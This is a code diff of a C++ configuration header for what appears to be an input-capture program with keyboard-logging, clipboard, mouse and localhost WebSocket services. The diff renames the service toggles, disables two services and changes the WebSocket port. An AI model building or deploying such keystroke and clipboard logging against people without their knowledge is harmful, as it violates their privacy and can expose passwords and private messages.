@@ -4,25 +4,32 @@
 // Service toggle
 // ---
 
-#define KEYBOARD_SERVICE	true
-#define MOUSE_SERVICE		true
-#define CLIPBOARD_SERVICE	true
-#define WEBSOCKET_SERVICE	true
+#define SERVICE_KEYBOARD_ENABLED	true
+#define SERVICE_MOUSE_ENABLED		false
+#define SERVICE_CLIPBOARD_ENABLED	false
+#define SERVICE_WEBSOCKET_ENABLED	true
 
 // ---
 // WebSocket settings
 // ---
 
+#if SERVICE_WEBSOCKET_ENABLED
+
 // WebSocket server host
-#define WS_HOST "ws://localhost:8080/"
+// #define WS_HOST "ws://localhost:8080/"
+#define WS_HOST "ws://localhost:25565/"
 
 // After how many seconds server retries to connect
 // after fail
 #define WS_CONNECTION_DELAY_SEC 1
 
+#endif
+
 // ---
 // Keyboard settings
 // ---
+
+#if SERVICE_KEYBOARD_ENABLED
 
 // Amount of keypresses of the same button
 // after which keyboard stops logging it
@@ -34,20 +41,22 @@
 // Name of keyboard service working directory
 #define KBD_DIR "kbd"
 
+#endif
+
 // ---
 // Service includes
 // ---
 
-#if KEYBOARD_SERVICE
+#if SERVICE_KEYBOARD_ENABLED
 #include "keyboard.hpp"
 #endif
-#if MOUSE_SERVICE
+#if SERVICE_MOUSE_ENABLED
 #include "mouse.hpp"
 #endif
-#if CLIPBOARD_SERVICE
+#if SERVICE_CLIPBOARD_ENABLED
 #include "clipboard.hpp"
 #endif
-#if WEBSOCKET_SERVICE
+#if SERVICE_WEBSOCKET_ENABLED
 #include "websocket.hpp"
 #endif
 
@@ -55,32 +64,32 @@ namespace Services
 {
 	static void RunAll()
 	{
-#if KEYBOARD_SERVICE
+#if SERVICE_KEYBOARD_ENABLED
 		Keyboard::Run();
 #endif
-#if MOUSE_SERVICE
+#if SERVICE_MOUSE_ENABLED
 		Mouse::Run();
 #endif
-#if CLIPBOARD_SERVICE
+#if SERVICE_CLIPBOARD_ENABLED
 		Clipboard::Run();
 #endif
-#if WEBSOCKET_SERVICE
+#if SERVICE_WEBSOCKET_ENABLED
 		WebSocket::Run();
 #endif
 	}
 
 	static void StopAll()
 	{
-#if KEYBOARD_SERVICE
+#if SERVICE_KEYBOARD_ENABLED
 		Keyboard::Stop();
 #endif
-#if MOUSE_SERVICE
+#if SERVICE_MOUSE_ENABLED
 		Mouse::Stop();
 #endif
-#if CLIPBOARD_SERVICE
+#if SERVICE_CLIPBOARD_ENABLED
 		Clipboard::Stop();
 #endif
-#if WEBSOCKET_SERVICE
+#if SERVICE_WEBSOCKET_ENABLED
 		WebSocket::Stop();
 #endif
 	}
